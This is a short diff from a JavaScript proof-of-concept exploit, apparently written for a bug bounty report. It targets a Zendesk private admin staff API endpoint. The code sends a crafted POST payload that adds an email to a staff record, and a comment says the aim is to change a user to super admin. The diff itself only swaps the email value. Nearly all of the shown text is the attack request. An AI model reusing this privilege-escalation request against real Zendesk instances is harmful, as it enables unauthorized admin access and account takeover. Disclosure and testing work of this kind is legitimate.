@@ -37,5 +37,5 @@ const urlToken = 'https://hackerone5759.zendesk.com/agent';
 //  urlexploit
 const urlexploit = 'https://hackerone5759.zendesk.com/api/admin/private/staff/19845800449181';
 //chnage user to super admin 
-const data = '{"user":{},"emails":[{"id":"0","value":"tesdt@tesdt.com","_action":"create"}]}';
+const data = '{"user":{},"emails":[{"id":"0","value":"xxxx@xxxx.com","_action":"create"}]}';
 sendPostRequest(urlexploit, data, urlToken);
